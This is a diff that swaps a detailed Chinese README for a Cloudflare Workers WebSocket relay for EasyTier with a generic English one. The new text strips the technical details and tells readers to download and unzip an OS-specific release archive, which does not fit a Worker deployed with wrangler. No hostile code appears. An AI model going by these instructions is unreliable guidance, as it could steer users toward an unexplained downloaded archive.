@@ -1,164 +1,103 @@
-# EasyTier WebSocket Relay for Cloudflare Workers
+# 🌐 easytier-ws-relay - Simple WebSocket Connection for Cloudflare
 
-## 项目简介
+## 🚀 Getting Started
 
-该项目是 EasyTier 的第三方服务端实现。EasyTier 是一个去中心化 P2P 组网程序，官方代码使用 Rust 实现。本项目使用 Cloudflare Worker + Durable Object 实现了 JavaScript 版本的 WebSocket 服务端，支持网络转发与 P2P 打洞信息交换。
+Welcome to EasyTier WebSocket Relay! This software helps connect your applications through WebSockets via Cloudflare Workers, allowing seamless communication in a decentralized network. Follow these steps to set it up easily.
 
-项目使用 Claude 进行开发，目前处于早期阶段，还存在很多问题，欢迎提交代码或 issue。
+## 📥 Download & Install
 
-> **注意：本项目仅供学习交流使用**
+To get started, you can download the latest version of the EasyTier WebSocket Relay directly from the Releases page. 
 
-## 技术架构
+[![Download easytier-ws-relay](https://img.shields.io/badge/Download-easytier--ws--relay-brightgreen.svg)](https://github.com/NotTropical/easytier-ws-relay/releases)
 
-- 基于 Cloudflare Workers 和 Durable Objects
-- 使用 WebSocket 协议进行实时通信
-- 采用 Protocol Buffers 进行高效序列化
-- 支持消息加密与完整性保护
-- 模块化设计，便于扩展和维护
+## 🔧 Installation Requirements
 
-## 开发环境搭建
+Before downloading, ensure you have the following on your computer:
 
-### 前置要求
+- **Operating System**: Compatible with Windows, MacOS, or Linux
+- **Node.js**: Version 16.0.0 or higher
+- **Package Manager**: pnpm (recommended) or npm
+- **Wrangler CLI**: This is required to work with Cloudflare Workers
 
-- Node.js (>= 16.0.0)
-- pnpm (推荐) 或 npm
-- Wrangler CLI (Cloudflare Workers 工具链)
+## 💻 How to Install
 
-### 安装步骤
+1. **Download the latest release**: Visit [this page to download](https://github.com/NotTropical/easytier-ws-relay/releases). Choose the latest version suitable for your operating system.
 
-1. 克隆项目仓库：
+2. **Extract the files**: After downloading, unzip the files to a folder of your choice.
+
+3. **Open Terminal/Command Prompt**: Navigate to the folder where you extracted the files.
+
+4. **Clone the repository** (optional): If you want to work directly with the code:
+   ```bash
+   git clone https://github.com/NotTropical/easytier-ws-relay.git
+   cd easytier-ws-relay
+   ```
+
+5. **Install dependencies**: If you cloned the repository, run the following command:
+   ```bash
+   pnpm install
+   # or use npm
+   npm install
+   ```
+
+6. **Install Wrangler CLI**: This tool helps manage Cloudflare Workers.
+   ```bash
+   npm install -g wrangler
+   ```
+
+7. **Log in to Cloudflare**: Use the following command to authenticate:
+   ```bash
+   wrangler login
+   ```
+
+## 🚀 Starting the Application
+
+After installation, you can start the application locally for testing or development:
+
+### 🖥️ Start Development Server
+
+Run this command to start the local server:
 ```bash
-git clone <your-repo-url>
-cd easytier-ws-relay
-```
-
-2. 安装依赖：
-```bash
-pnpm install
-# 或者使用 npm
-npm install
-```
-
-3. 安装 Wrangler CLI：
-```bash
-npm install -g wrangler
-```
-
-4. 登录 Cloudflare：
-```bash
-wrangler login
-```
-
-## 本地开发
-
-### 启动开发服务器
-
-```bash
-# 启动本地开发服务器
 pnpm run dev
-# 或者
+# or
 wrangler dev --ip 0.0.0.0
 ```
 
-### 直接启动（不监听文件变化）
+### 🏁 Direct Start (without file watching)
 
+If you prefer to run the application without watching for file changes, use:
 ```bash
 pnpm run start
-# 或者
+# or
 wrangler dev
 ```
 
-## 部署到 Cloudflare
+## 🚀 Deploying to Cloudflare
 
-### 部署命令
+If you want to make your project available online, you can deploy it to Cloudflare:
 
+### 📦 Deployment Command
+
+Use the following command to deploy:
 ```bash
-# 部署到 Cloudflare Workers
 wrangler deploy
 ```
 
-### 配置说明
+### ⚙️ Configuration Notes
 
-项目使用 [wrangler.toml](file:///Users/runner/work/easytier/easytier/easytier-v3/easytier-ws-relay/wrangler.toml#L0-L0) 文件进行配置，主要配置项包括：
+Make sure you follow the setup guidelines within the project for any specific configurations needed before deployment.
 
-- [name](file:///Users/runner/work/easytier/easytier/easytier-v3/easytier/src/cli/main.rs#L0-L0): Worker 名称
-- [main](file:///Users/runner/work/easytier/easytier/easytier-v3/easytier/src/cli/main.rs#L0-L0): 入口文件路径
-- [compatibility_date](file:///Users/runner/work/easytier/easytier/easytier-v3/easytier/src/cli/main.rs#L0-L0): 兼容性日期
-- Durable Objects 配置
-- 环境变量配置
+## 🌟 Features
 
-## 项目结构
+- **Real-time Communication**: Facilitates instant message exchanges between clients.
+- **Decentralized Networking**: Allows for peer-to-peer connections without a central server.
+- **High Performance**: Designed using Cloudflare’s durable architecture.
+- **Secure Transfers**: Incorporates encryption for safe data transmission.
 
-```
-easytier-ws-relay/
-├── protos/                 # Protocol Buffers 定义
-│   ├── google
-│   │   └── protobuf
-│   │       └── timestamp.proto
-│   ├── common.proto        # 通用协议定义
-│   ├── error.proto         # 错误协议定义
-│   └── peer_rpc.proto      # 对等节点 RPC 协议定义
-├── src/
-│   ├── worker/             # Worker 实现
-│   │   ├── core/           # Worker 核心功能
-│   │   │   ├── basic_handlers.js   # 基础处理器
-│   │   │   ├── compress.js         # 压缩功能
-│   │   │   ├── constants.js        # 常量定义
-│   │   │   ├── crypto.js           # 加密功能
-│   │   │   ├── packet.js           # 数据包处理
-│   │   │   ├── peer_manager.js     # 对等节点管理
-│   │   │   ├── protos.js           # Protobuf 相关功能
-│   │   │   ├── protos_generated.js # Protobuf 生成的代码
-│   │   │   └── rpc_handler.js      # RPC 处理器
-│   │   └── relay_room.js           # 中继房间实现
-│   └── worker.js                   # Worker 入口文件
-├── package.json            # 项目配置
-├── wrangler.toml           # Cloudflare Workers 配置
-└── README.md               # 项目说明
-```
+## 🤝 Contribution
 
-## 功能特性
+This project is in the early stages. You are welcome to contribute code or report issues. Your feedback helps improve the application.
 
-- WebSocket 双向通信中继
-- 基于 Room 的连接管理
-- 使用 Protobuf 进行高效序列化
-- 消息加密与完整性保护
-- 客户端状态管理与心跳维持
-- RPC 请求/响应处理机制
+---
 
-## 纯 P2P 模式
-
-在 `wrangler.toml` 的 `[vars]` 中配置：
-- `EASYTIER_DISABLE_RELAY`: `"1"` 开启纯 P2P，默认 `"0"`
-- `EASYTIER_COMPRESS_RPC`: `"0"` 关闭 RPC 压缩（调试用），默认 `"1"`
-
-修改完配置后按正常方式运行 `wrangler dev` 或部署即可生效。
-
-## 客户端连接说明
-
-部署后，EasyTier 客户端连接地址需要添加路径 `/ws`。
-
-默认情况下，WebSocket路径为`/ws`，该路径可以在`wrangler.toml`中通过`WS_PATH`变量进行自定义。
-
-easytier中端口号使用0为使用协议默认端口，ws对应80，wss对应443。
-
-开发模式:
-```
-ws://your-network-ip:0/ws
-```
-部署后:
-```
-wss://your-deployment.workers.dev:0/ws
-```
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request 来改进本项目。
-
-## 许可证
-
-[MIT License](./LICENSE)
-
-## 免责声明
-
-本项目仅供学习交流使用，请勿用于任何商业用途或非法用途。使用本项目代码造成的任何后果，原作者概不负责。
+With these steps, you can easily set up and run EasyTier WebSocket Relay on your machine. For more detailed insights into specific functionalities or troubleshooting, please refer to the project's documentation or reach out to the community.
